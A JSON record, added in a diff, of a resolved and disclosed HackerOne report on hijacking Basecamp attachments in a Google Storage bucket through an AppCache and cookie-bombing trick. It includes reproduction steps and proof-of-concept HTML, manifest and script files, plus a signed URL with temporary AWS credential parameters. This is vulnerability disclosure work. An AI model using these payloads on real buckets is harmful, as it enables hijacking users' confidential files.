@@ -1,0 +1,134 @@
+{
+  "id": 403602,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDM2MDI=",
+  "url": "https://hackerone.com/reports/403602",
+  "title": "Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-31T18:58:43.094Z",
+  "submitted_at": "2018-08-31T18:58:43.094Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hudmi",
+    "url": "/hudmi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/794/ee8e97b1dd494059d1560fabeb1b43a842fca78c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-26T18:20:26.237Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-10-27T18:20:21.785Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Basecamp attachments are stored in the `bc3_production_blobs` bucket in the root directory and can be served with `text/html` content-type. \n\nhttps://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html\n\nSo with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker. \nTo know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/\n\n##Reproduction steps\nTo upload the files:\n1. Login to 3.basecamp.com\n2. Open campfire of any project\n3. Upload target files \n4. Extract direct links of them to Google Storage and remove `response-content-disposition` param\n\nI have uploaded 3 files by this way:\n```\n<html manifest=\"[manifest_url]\">\nThis is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.\n<script>\nsetTimeout(function(){\nfor(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};\n}, 3000);\n</script>\n</html>\n```\n```\nCACHE MANIFEST \n\nFALLBACK:\n/bc3_production_blobs/ [fallback_url]\n```\n```\n<html>\n<script>\nalert('Your request to the page '+location.href+' is hijacked!');\n</script>\n</html>\n```\n\n##PoC\nGo to http://████████/bc3attach and then try to open any direct link of `bc3_production_blobs` bucket. You will see alert popup with full url of this file.\nRefer to the video.\n\n## Impact\n\nDirect links to any attachments can be hijacked and confedential files can be compromised",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 340718,
+      "file_name": "capture-132.avi",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/718/989c84f09b7b41f34c3abf7706899a8deee834d3/capture-132.avi?response-content-disposition=attachment%3B%20filename%3D%22capture-132.avi%22%3B%20filename%2A%3DUTF-8%27%27capture-132.avi&response-content-type=video%2Fx-msvideo&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVNV4E25D%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCIE960VllZtNC%2FbUPA0vV%2FxLVgvvK71RIGviKisKlxfVtAiBr0qGGKK6SWddIJhbbA9j4qbsXWcMBgOHpuLgrg%2FW2Hyq7BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMqb1%2BrAXzixLF%2BjnvKo8F76IyRZgBGCRdHV1hMUR0jT3xf1xlLq%2Bqx1%2BorvjV6eTVieENOmrgUaUrinJIYPLWg2YZUW%2B5l8a38y%2FEZcGzcqYuSE%2BI4QLJFyns2org4rDi0OYXY4bffY1nBT2wKcb6OHfMEn4Bvtv9RuyNeSvGPwt2Gbc4d2n8og9ytXeXESQ5Mjlhng8ZAUeY5DNRhZxXVDA0cVvk2SMa6HKesuby%2FpYqWjPsPIJPniLE6T9MaJuIgyp6z5AzhESyvHtKB9yVOTfpT5Mv3uErEVYDWHDHePLArcvChHf6AynHQorHldA1lcKWBwipmOmvAILOREawkibTIZrrTLLV%2BkcT6cy98OILJ4R4sAVmV3ZAN3Gp9IPBCReeJRcZddalv%2F7h9x%2BPWN6lm%2BOTnvV0crwvhL%2FjHeoQViPPcVSnUUWQ1GeTveb4gY%2BNLKZ8RdClQBwvugU3d1smsDzAs0qgr523sptcl0LNzc07CjyMVEDPzy3fu%2FH0GqpiM3%2B4cgQWgTipFSaHK9tMkaff3wlMZfo41kbd1JwLWCQYRLXcslzmKOq2lPSSOZml2x84pzFAqvNVPuF%2BKd7Thj33i2Vheshkv82bmHCV7IZbQO%2FwrPS8q3gAIkMkr60p1VLvGWaOkmxnwqBrdudoP3VqAirVW1Di%2FtjtueplXj0QV3oqLUpX4iPqgzwOq8UIRmyg%2FD4vUZlrVj%2BrBNUzzZVbo3ryjuLd0nfm50s2vSYwffmsQFgTBMcrch3RiNwzgfJ6%2FZYok9HRM%2F4avHOWbRfu4w2UUEJR8pMqNiuegCco0W1fcSh5MPzPm%2FTKFrlrZu%2BbrR6WTMIa9bLwEOS2KpqsWUdQcScGNA9LyN1bN3Ee%2Feufc%2FEgxorsljCfjv3PBjqyAZfYEPjougdmjiACVMNjwoba5DF0McHETZHiK3QwZYUKAaHfv9fvOjaowSD5nGhz%2BIa9jJMsfjotcGV4vqGge%2BC%2FlWdaHZPTF98TAD7fL7mIhKoOTncumT0G3dat6%2B%2BAq82gTgRhrUytPJfIfzXRGxrdUNdYQ1U%2Bu1IkaxsFTi2eNxOLCNQUrnmb43%2ByGo8Cira8h6aRRo%2FgvoBf%2BjEisaDt3OdtNhDd4%2F7uMhwIvEhTfgg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0515302af6151fe023297ad824c0377a335e37b1436569413ea5939f87297452",
+      "file_size": 595882,
+      "type": "video/x-msvideo",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-26T18:20:21.890Z",
+  "allow_singular_disclosure_after": -171924981.25393745,
+  "singular_disclosure_allowed": true,
+  "vote_count": 57,
+  "voters": [
+    "arist0phanes",
+    "xploiterr",
+    "fqdn",
+    "mashoud1122",
+    "shreyaschavhan",
+    "bibekshah",
+    "bughunterninja",
+    "locs3c",
+    "mohaned0101",
+    "thalaivar304",
+    "and 47 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 4655,
+    "asset_type": "URL",
+    "asset_identifier": "3.basecamp.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
